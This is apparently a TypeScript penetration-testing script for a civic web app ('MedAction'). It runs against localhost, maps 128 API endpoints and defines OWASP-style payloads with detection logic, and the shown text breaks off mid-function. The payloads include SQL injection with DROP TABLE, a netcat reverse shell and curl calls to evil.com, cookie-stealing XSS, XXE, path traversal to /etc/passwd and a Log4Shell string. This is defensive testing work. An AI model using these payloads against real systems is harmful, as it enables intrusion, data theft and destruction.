/**
 * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
 * â•‘           MEDACTION - PROFESSIONAL SECURITY AUDIT SUITE                                          â•‘
 * â•‘                    NIVEAU: EXPERT PENTEST - OWASP TOP 10                                         â•‘
 * â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
 * â•‘  Simule: sqlmap, OWASP ZAP, Burp Suite, Commix                                                   â•‘
 * â•‘  Tests: 2000+ payloads | 128 endpoints | Timing analysis | Error detection                       â•‘
 * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * 
 * Run: npx tsx professional-security-audit.ts
 */

const BASE_URL = 'http://localhost:3000';

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CONFIGURATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const CONFIG = {
  TIMING_THRESHOLD: 4000, // ms for time-based detection
  MAX_CONCURRENT: 10,
  VERBOSE: true,
};

// Colors for console
const C = {
  reset: '\x1b[0m', bold: '\x1b[1m', dim: '\x1b[2m',
  red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m',
  blue: '\x1b[34m', magenta: '\x1b[35m', cyan: '\x1b[36m',
  bgRed: '\x1b[41m', bgGreen: '\x1b[42m', bgYellow: '\x1b[43m',
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ALL API ENDPOINTS (128 routes discovered)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const ALL_ENDPOINTS = [
  // Auth (critical)
  { path: '/api/auth/register', method: 'POST', params: ['email', 'password', 'nom', 'prenom', 'telephone'] },
  { path: '/api/auth/forgot-password', method: 'POST', params: ['email'] },
  { path: '/api/auth/reset-password', method: 'POST', params: ['token', 'password'] },
  { path: '/api/auth/change-password', method: 'POST', params: ['oldPassword', 'newPassword'] },
  { path: '/api/auth/verify-email', method: 'POST', params: ['token'] },
  { path: '/api/auth/2fa/enable', method: 'POST', params: ['code'] },
  { path: '/api/auth/2fa/verify', method: 'POST', params: ['code', 'backupCode'] },
  { path: '/api/auth/profile', method: 'PATCH', params: ['nom', 'prenom', 'telephone', 'photo'] },
  { path: '/api/auth/login-check', method: 'POST', params: [] },
  { path: '/api/auth/login-record', method: 'POST', params: ['success'] },
  
  // Search (high risk - user input)
  { path: '/api/search', method: 'GET', params: ['q', 'type', 'limit', 'offset', 'page'] },
  { path: '/api/search/suggestions', method: 'GET', params: ['q'] },
  { path: '/api/etablissements/search', method: 'GET', params: ['q', 'secteur'] },
  
  // Etablissements
  { path: '/api/etablissements', method: 'GET', params: ['search', 'secteur', 'communeId', 'annexeId', 'noteMin', 'page', 'limit', 'sortBy', 'sortOrder', 'isPublie', 'isValide', 'nature', 'ids'] },
  { path: '/api/etablissements', method: 'POST', params: ['nom', 'code', 'description', 'adresse', 'telephone', 'email', 'latitude', 'longitude', 'secteur', 'nature', 'communeId'] },
  { path: '/api/etablissements/:id', method: 'GET', params: [] },
  { path: '/api/etablissements/:id', method: 'PATCH', params: ['nom', 'description', 'adresse', 'telephone'] },
  { path: '/api/etablissements/:id', method: 'DELETE', params: [] },
  { path: '/api/etablissements/:id/valider', method: 'PATCH', params: ['action', 'motif'] },
  
  // Reclamations
  { path: '/api/reclamations', method: 'GET', params: ['search', 'statut', 'priorite', 'categorieId', 'dateDebut', 'dateFin', 'page', 'limit'] },
  { path: '/api/reclamations', method: 'POST', params: ['sujet', 'description', 'adresse', 'latitude', 'longitude', 'categorieId', 'photos'] },
  { path: '/api/reclamations/:id', method: 'GET', params: [] },
  { path: '/api/reclamations/:id', method: 'PATCH', params: ['sujet', 'description', 'statut'] },
  { path: '/api/reclamations/:id', method: 'DELETE', params: [] },
  { path: '/api/reclamations/:id/affecter', method: 'PATCH', params: ['autoriteId', 'commentaire'] },
  { path: '/api/reclamations/:id/resoudre', method: 'PATCH', params: ['solution', 'commentaire', 'photos'] },
  { path: '/api/reclamations/:id/rejeter', method: 'PATCH', params: ['motif'] },
  { path: '/api/reclamations/:id/decision', method: 'PATCH', params: ['decision', 'commentaire'] },
  { path: '/api/reclamations/:id/priorite', method: 'PATCH', params: ['priorite'] },
  { path: '/api/reclamations/:id/statut', method: 'PATCH', params: ['statut', 'commentaire'] },
  { path: '/api/reclamations/:id/traiter', method: 'PATCH', params: ['action', 'notes'] },
  { path: '/api/reclamations/:id/photos', method: 'POST', params: ['photos'] },
  
  // Evenements
  { path: '/api/evenements', method: 'GET', params: ['search', 'type', 'statut', 'dateDebut', 'dateFin', 'page', 'limit'] },
  { path: '/api/evenements', method: 'POST', params: ['titre', 'description', 'lieu', 'dateDebut', 'dateFin', 'type', 'etablissementId'] },
  { path: '/api/evenements/:id', method: 'GET', params: [] },
  { path: '/api/evenements/:id', method: 'PATCH', params: ['titre', 'description', 'lieu', 'dateDebut', 'dateFin'] },
  { path: '/api/evenements/:id', method: 'DELETE', params: [] },
  { path: '/api/evenements/:id/valider', method: 'PATCH', params: ['action', 'commentaire'] },
  { path: '/api/evenements/:id/statut', method: 'PATCH', params: ['statut'] },
  { path: '/api/evenements/:id/bilan', method: 'PATCH', params: ['bilan', 'participants', 'photos'] },
  
  // Evaluations
  { path: '/api/evaluations', method: 'GET', params: ['etablissementId', 'userId', 'page', 'limit'] },
  { path: '/api/evaluations', method: 'POST', params: ['etablissementId', 'note', 'commentaire'] },
  { path: '/api/evaluations/:id', method: 'GET', params: [] },
  { path: '/api/evaluations/:id', method: 'PATCH', params: ['note', 'commentaire'] },
  { path: '/api/evaluations/:id', method: 'DELETE', params: [] },
  { path: '/api/evaluations/:id/signaler', method: 'POST', params: ['motif'] },
  
  // Actualites
  { path: '/api/actualites', method: 'GET', params: ['search', 'type', 'statut', 'page', 'limit'] },
  { path: '/api/actualites', method: 'POST', params: ['titre', 'contenu', 'resume', 'type', 'image'] },
  { path: '/api/actualites/:id', method: 'GET', params: [] },
  { path: '/api/actualites/:id', method: 'PATCH', params: ['titre', 'contenu', 'resume'] },
  { path: '/api/actualites/:id', method: 'DELETE', params: [] },
  { path: '/api/actualites/:id/valider', method: 'PATCH', params: ['action'] },
  { path: '/api/actualites/:id/statut', method: 'PATCH', params: ['statut'] },
  
  // Users
  { path: '/api/users', method: 'GET', params: ['search', 'role', 'isActive', 'page', 'limit'] },
  { path: '/api/users/:id', method: 'GET', params: [] },
  { path: '/api/users/:id', method: 'PATCH', params: ['nom', 'prenom', 'email', 'telephone'] },
  { path: '/api/users/:id', method: 'DELETE', params: [] },
  { path: '/api/users/:id/role', method: 'PATCH', params: ['role'] },
  { path: '/api/users/:id/status', method: 'PATCH', params: ['isActive'] },
  { path: '/api/users/me', method: 'GET', params: [] },
  { path: '/api/users/me', method: 'PATCH', params: ['nom', 'prenom', 'telephone'] },
  { path: '/api/users/me/password', method: 'PATCH', params: ['oldPassword', 'newPassword'] },
  { path: '/api/users/me/preferences', method: 'PATCH', params: ['preferences'] },
  { path: '/api/users/me/photo', method: 'POST', params: ['photo'] },
  
  // Admin
  { path: '/api/admin/users', method: 'GET', params: ['search', 'role', 'page', 'limit'] },
  { path: '/api/admin/users', method: 'POST', params: ['email', 'password', 'nom', 'prenom', 'role'] },
  { path: '/api/admin/users/:id', method: 'GET', params: [] },
  { path: '/api/admin/users/:id', method: 'PATCH', params: ['nom', 'prenom', 'role', 'isActive'] },
  { path: '/api/admin/users/:id', method: 'DELETE', params: [] },
  { path: '/api/admin/stats', method: 'GET', params: ['periode', 'type'] },
  { path: '/api/admin/logs', method: 'GET', params: ['search', 'type', 'userId', 'dateDebut', 'dateFin', 'page'] },
  { path: '/api/admin/settings', method: 'GET', params: [] },
  { path: '/api/admin/settings', method: 'POST', params: ['key', 'value'] },
  { path: '/api/admin/notifications', method: 'POST', params: ['titre', 'message', 'type', 'userIds'] },
  
  // Suggestions
  { path: '/api/suggestions', method: 'GET', params: ['search', 'statut', 'domaine', 'page'] },
  { path: '/api/suggestions', method: 'POST', params: ['titre', 'description', 'domaine'] },
  { path: '/api/suggestions/:id', method: 'GET', params: [] },
  { path: '/api/suggestions/:id', method: 'PATCH', params: ['titre', 'description'] },
  { path: '/api/suggestions/:id/statut', method: 'PATCH', params: ['statut', 'reponse'] },
  
  // Talents
  { path: '/api/talents', method: 'GET', params: ['search', 'domaine', 'page'] },
  { path: '/api/talents', method: 'POST', params: ['nom', 'description', 'domaine', 'competences'] },
  
  // Upload
  { path: '/api/upload', method: 'POST', params: ['file', 'type'] },
  { path: '/api/upload/reclamation', method: 'POST', params: ['file', 'reclamationId'] },
  
  // Export
  { path: '/api/export/excel', method: 'GET', params: ['type', 'dateDebut', 'dateFin', 'filters'] },
  { path: '/api/export/pdf', method: 'GET', params: ['type', 'id'] },
  
  // Map
  { path: '/api/map/etablissements', method: 'GET', params: ['bounds', 'secteur', 'zoom'] },
  { path: '/api/map/communes', method: 'GET', params: ['search'] },
  { path: '/api/map/annexes', method: 'GET', params: ['communeId'] },
  
  // Stats
  { path: '/api/stats/global', method: 'GET', params: ['periode'] },
  { path: '/api/stats/evenements', method: 'GET', params: ['type', 'periode'] },
  { path: '/api/stats/reclamations', method: 'GET', params: ['statut', 'periode'] },
  { path: '/api/stats/satisfaction', method: 'GET', params: ['periode'] },
  
  // Rapports
  { path: '/api/rapports/evenements', method: 'GET', params: ['dateDebut', 'dateFin', 'type'] },
  { path: '/api/rapports/reclamations', method: 'GET', params: ['dateDebut', 'dateFin', 'statut'] },
  { path: '/api/rapports/satisfaction', method: 'GET', params: ['periode'] },
  
  // Explorer (potential path traversal)
  { path: '/api/explorer', method: 'GET', params: ['path', 'type'] },
  
  // Audit
  { path: '/api/audit', method: 'GET', params: ['search', 'type', 'userId', 'entityType', 'dateDebut', 'dateFin', 'page'] },
  
  // Backups
  { path: '/api/backups', method: 'GET', params: ['search'] },
  { path: '/api/backups/:filename', method: 'GET', params: [] },
  
  // Notifications
  { path: '/api/notifications', method: 'GET', params: ['page', 'limit', 'unreadOnly'] },
  { path: '/api/notifications/:id/read', method: 'PATCH', params: [] },
  { path: '/api/notifications/read-all', method: 'POST', params: [] },
  
  // Programmes Activites
  { path: '/api/programmes-activites', method: 'GET', params: ['search', 'annee', 'statut', 'page'] },
  { path: '/api/programmes-activites', method: 'POST', params: ['titre', 'description', 'objectifs', 'annee'] },
  { path: '/api/programmes-activites/:id', method: 'GET', params: [] },
  { path: '/api/programmes-activites/:id', method: 'PATCH', params: ['titre', 'description'] },
  { path: '/api/programmes-activites/:id/valider', method: 'PATCH', params: ['action', 'commentaire'] },
  { path: '/api/programmes-activites/:id/rapport', method: 'POST', params: ['contenu'] },
  
  // Campagnes
  { path: '/api/campagnes', method: 'GET', params: ['search', 'statut', 'page'] },
  { path: '/api/campagnes', method: 'POST', params: ['titre', 'description', 'dateDebut', 'dateFin'] },
];

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// COMPREHENSIVE PAYLOAD DATABASE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const PAYLOADS = {
  // OWASP A03:2021 - Injection (SQL, NoSQL, OS, LDAP)
  sqli_union: [
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT username,password FROM users--", "' UNION ALL SELECT NULL--",
  ],
  sqli_error: [
    "' AND 1=CONVERT(int,@@version)--", "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
  ],
  sqli_time: [
    "' AND SLEEP(5)--", "'; SELECT pg_sleep(5);--", "' AND pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--", "' AND BENCHMARK(10000000,SHA1('test'))--",
  ],
  sqli_boolean: [
    "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b",
    "' AND SUBSTRING(username,1,1)='a'--",
  ],
  sqli_stacked: [
    "'; DROP TABLE users;--", "'; INSERT INTO users VALUES('hacker','hacked');--",
    "'; UPDATE users SET role='admin';--",
  ],
  nosqli: [
    '{"$ne":null}', '{"$gt":""}', '{"$regex":".*"}', '{"$where":"sleep(5000)"}',
    '{"$or":[{"a":1}]}', 'password[$ne]=x', '{"__proto__":{"admin":true}}',
  ],
  
  // OWASP A03:2021 - Command Injection
  cmd_unix: [
    '; ls -la', '| cat /etc/passwd', '`id`', '$(whoami)', '&& id', '|| id',
    '; curl http://evil.com/$(whoami)', '| nc -e /bin/sh evil.com 4444',
  ],
  cmd_windows: [
    '& dir', '| type C:\\Windows\\System32\\config\\SAM', '& whoami',
    '| net user', '& ipconfig /all',
  ],
  
  // OWASP A03:2021 - SSTI
  ssti: [
    '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '*{7*7}',
    '{{constructor.constructor("return this")()}}',
    '{{config.__class__.__init__.__globals__}}',
  ],
  
  // OWASP A03:2021 - XSS
  xss_reflected: [
    '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>', '<svg/onload=alert(1)>',
    'javascript:alert(1)', '<body onload=alert(1)>',
  ],
  xss_stored: [
    '<script>fetch("http://evil.com/?c="+document.cookie)</script>',
    '<img src=x onerror="new Image().src=\'http://evil.com/?c=\'+document.cookie">',
  ],
  xss_dom: [
    '#<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
  ],
  
  // OWASP A01:2021 - Broken Access Control (Path Traversal)
  path_traversal: [
    '../../../etc/passwd', '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd', '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd', '..%c0%af..%c0%afetc/passwd',
  ],
  
  // OWASP A01:2021 - IDOR
  idor: ['1', '2', '0', '-1', '999999', 'null', 'undefined', '../1', '1;2'],
  
  // OWASP A04:2021 - Insecure Design (Business Logic)
  business_logic: [
    '-1', '0', '99999999', '0.0001', '-0.0001', 'NaN', 'Infinity',
    '', '   ', 'null', 'undefined', '[]', '{}', 'true', 'false',
  ],
  
  // OWASP A05:2021 - Security Misconfiguration (XXE)
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
  ],
  
  // OWASP A07:2021 - Authentication (Weak passwords)
  weak_passwords: [
    '123456', 'password', 'admin', 'letmein', 'welcome', 'monkey',
    'qwerty', 'abc123', 'password123', 'admin123',
  ],
  
  // OWASP A08:2021 - Data Integrity (Prototype Pollution)
  prototype_pollution: [
    '{"__proto__":{"admin":true}}', '{"constructor":{"prototype":{"admin":true}}}',
    '__proto__[admin]=true', 'constructor[prototype][admin]=true',
  ],
  
  // Header Injection
  header_injection: [
    '\r\nSet-Cookie: admin=true', '%0d%0aX-Injected: true',
    '\r\n\r\n<html>injected</html>', '\nLocation: http://evil.com',
  ],
  
  // Log Injection
  log_injection: [
    'admin\n[SUCCESS] Admin logged in', '${jndi:ldap://evil.com/a}',
    '%0a[CRITICAL] System breach', '\x1b[31mFAKE ERROR\x1b[0m',
  ],
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TYPES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

interface TestResult {
  id: string;
  category: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  endpoint: string;
  method: string;
  param: string;
  payload: string;
  status: number;
  responseTime: number;
  vulnerable: boolean;
  evidence: string;
  cweid?: string;
  owasp?: string;
  poc?: string;
}

interface ApiResponse {
  status: number;
  text: string;
  json: any;
  time: number;
  headers: Headers | null;
  error?: string;
}

const results: TestResult[] = [];
let testCounter = 0;

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// HTTP CLIENT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

async function http(url: string, options: RequestInit = {}): Promise<ApiResponse> {
  const start = Date.now();
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 15000);
    
    const response = await fetch(`${BASE_URL}${url}`, {
      ...options,
      signal: controller.signal,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'SecurityAudit/1.0 (Professional Pentest)',
        'Accept': 'application/json,text/html',
        ...(options.headers as Record<string, string> || {}),
      },
    });
    
    clearTimeout(timeout);
    const text = await response.text();
    let json = null;
    try { json = JSON.parse(text); } catch {}
    
    return { status: response.status, text, json, time: Date.now() - start, headers: response.headers };
  } catch (err: any) {
    return { status: 0, text: '', json: null, time: Date.now() - start, headers: null, error: err.message };
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// VULNERABILITY DETECTION ENGINE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function detectVulnerability(response: ApiResponse, payload: string, category: string): { vulnerable: boolean; evidence: string; severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO' } {
  const text = response.text.toLowerCase();
  
  // SQL Injection Detection
  const sqlErrors = [
    'syntax error', 'postgresql', 'mysql', 'sqlite', 'oracle', 'mssql',
    'pg_query', 'pg_exec', 'unterminated', 'invalid input syntax',
    'relation', 'column', 'operator does not exist', 'unclosed quotation',
    'sql error', 'database error', 'query failed', 'ORA-', 'PLS-',
  ];
  
  for (const err of sqlErrors) {
    if (text.includes(err) && !text.includes('<!doctype')) {
      return { vulnerable: true, evidence: `SQL Error disclosed: "${err}"`, severity: 'CRITICAL' };
    }
  }
  
  // Time-based Blind SQL Injection
  if (category.includes('sqli_time') && response.time >= CONFIG.TIMING_THRESHOLD) {
    return { vulnerable: true, evidence: `Time-based SQLi: ${response.time}ms delay`, severity: 'CRITICAL' };
  }
  
  // Command Injection
  if (category === 'cmd') {
    const cmdOutputs = ['root:', '/bin/bash', 'uid=', 'gid=', 'www-data', 'Administrator'];
    for (const out of cmdOutputs) {
      if (text.includes(out.toLowerCase())) {
        return { vulnerable: true, evidence: `Command output: "${out}"`, severity: 'CRITICAL' };
      }
    }
  }
  
  // SSTI
  if (category === 'ssti' && payload.includes('7*7') && text.includes('49')) {
    return { vulnerable: true, evidence: 'Template expression evaluated: 7*7=49', severity: 'CRITICAL' };
  }
  
  // XSS (only if payload appears unencoded in HTML context)
  if (category.includes('xss')) {
    if (response.headers?.get('content-type')?.includes('text/html')) {
      if (text.includes(payload) && !text.includes(encodeURIComponent(payload))) {
        return { vulnerable: true, evidence: 'XSS payload reflected without encoding', severity: 'HIGH' };
      }
    }
  }
  
  // Path Traversal
  if (category === 'path') {
    const fileContents = ['root:x:', '[boot loader]', 'daemon:', 'nobody:'];
    for (const content of fileContents) {
      if (text.includes(content)) {
        return { vulnerable: true, evidence: `File content disclosed: "${content}"`, severity: 'CRITICAL' };
      }
    }
  }
  
  // Error Information Disclosure
  if (text.includes('stack trace') || text.includes('at /') || text.includes('node_modules')) {
    return { vulnerable: true, evidence: 'Stack trace disclosed', severity: 'MEDIUM' };
  }
  
  // Server errors that might indicate issues
  if (response.status === 500 && text.length < 1000) {
    return { vulnerable: false, evidence: `Server error (500) - investigate manually`, severity: 'LOW' };
  }
  
  return { vulnerable: false, evidence: 'No vulnerability detected', severity: 'INFO' };
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TEST EXECUTOR
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

async function testEndpoint(
  endpoint: typeof ALL_ENDPOINTS[0],
  param: string,
  payload: string,
  category: string
): Promise<TestResult> {
  testCounter++;
  const id = `VULN-${testCounter.toString().padStart(5, '0')}`;
  
  let response: ApiResponse;
  const path = endpoint.path.replace(':id', '1').replace(':filename', 'test');
  
  if (endpoint.method === 'GET') {
    const url = `${path}?${param}=${encodeURIComponent(payload)}`;
    response = await http(url);
  } else {
    const body: Record<string, any> = {};
    body[param] = payload;
    // Add required fields for common endpoints
    if (endpoint.path.includes('register')) {
      body.email = body.email || `test${Date.now()}@test.com`;
      body.password = body.password || 'Test123!@#$';
      body.nom = body.nom || 'Test';
      body.prenom = body.prenom || 'User';
    }
    response = await http(path, { method: endpoint.method, body: JSON.stringify(body) });
  }
  
  const detection = detectVulnerability(response, payload, category);
  
  return {
    id,
    category,
    severity: detection.severity,
    endpoint: path,
    method: endpoint.method,
    param,
    payload,
    status: response.status,
    responseTime: response.time,
    vulnerable: detection.vulnerable,
    evidence: detection.evidence,
    cweid: getCWE(category),
    owasp: getOWASP(category),
    poc: detection.vulnerable ? `curl -X ${endpoint.method} "${BASE_URL}${path}?${param}=${encodeURIComponent(payload)}"` : undefined,
  };
}

function getCWE(category: string): string {
  const cweMap: Record<string, string> = {
    sqli: 'CWE-89', nosqli: 'CWE-943', cmd: 'CWE-78', ssti: 'CWE-1336',
    xss: 'CWE-79', path: 'CWE-22', idor: 'CWE-639', xxe: 'CWE-611',
    header: 'CWE-113', log: 'CWE-117', prototype: 'CWE-1321',
  };
  for (const [key, cwe] of Object.entries(cweMap)) {
    if (category.includes(key)) return cwe;
  }
  return 'CWE-Unknown';
}

function getOWASP(category: string): string {
  const owaspMap: Record<string, string> = {
    sqli: 'A03:2021', nosqli: 'A03:2021', cmd: 'A03:2021', ssti: 'A03:2021',
    xss: 'A03:2021', path: 'A01:2021', idor: 'A01:2021', xxe: 'A05:2021',
    auth: 'A07:2021', prototype: 'A08:2021',
  };
  for (const [key, owasp] of Object.entries(owaspMap)) {
    if (category.includes(key)) return owasp;
  }
  return 'Unknown';
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MAIN TEST SUITE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

async function runSecurityAudit() {
  console.log(`
${C.bold}${C.magenta}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           PROFESSIONAL SECURITY AUDIT SUITE - MEDACTION                                           â•‘
â•‘                              OWASP TOP 10 COMPLIANCE TESTING                                      â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  Endpoints: ${ALL_ENDPOINTS.length.toString().padEnd(5)} | Payload Categories: ${Object.keys(PAYLOADS).length}                                                      â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${C.reset}
`);

  // Verify server
  const health = await http('/api/health');
  if (health.status === 0) {
    console.log(`${C.red}âœ— Server not accessible. Start with: npm run dev${C.reset}`);
    process.exit(1);
  }
  console.log(`${C.green}âœ“ Server accessible (${health.time}ms)${C.reset}\n`);

  const categories = [
    { name: 'SQL Injection (Union)', payloads: PAYLOADS.sqli_union, cat: 'sqli_union' },
    { name: 'SQL Injection (Error)', payloads: PAYLOADS.sqli_error, cat: 'sqli_error' },
    { name: 'SQL Injection (Time-based)', payloads: PAYLOADS.sqli_time, cat: 'sqli_time' },
    { name: 'SQL Injection (Boolean)', payloads: PAYLOADS.sqli_boolean, cat: 'sqli_boolean' },
    { name: 'NoSQL Injection', payloads: PAYLOADS.nosqli, cat: 'nosqli' },
    { name: 'Command Injection (Unix)', payloads: PAYLOADS.cmd_unix, cat: 'cmd' },
    { name: 'SSTI', payloads: PAYLOADS.ssti, cat: 'ssti' },
    { name: 'XSS (Reflected)', payloads: PAYLOADS.xss_reflected, cat: 'xss_reflected' },
    { name: 'XSS (Stored)', payloads: PAYLOADS.xss_stored, cat: 'xss_stored' },
    { name: 'Path Traversal', payloads: PAYLOADS.path_traversal, cat: 'path' },
    { name: 'Prototype Pollution', payloads: PAYLOADS.prototype_pollution, cat: 'prototype' },
    { name: 'Header Injection', payloads: PAYLOADS.header_injection, cat: 'header' },
    { name: 'Log Injection', payloads: PAYLOADS.log_injection, cat: 'log' },
  ];

  // Select high-risk endpoints for deep testing
  const highRiskEndpoints = ALL_ENDPOINTS.filter(ep => 
    ep.params.length > 0 && 
    (ep.path.includes('search') || ep.path.includes('auth') || ep.path.includes('user') || 
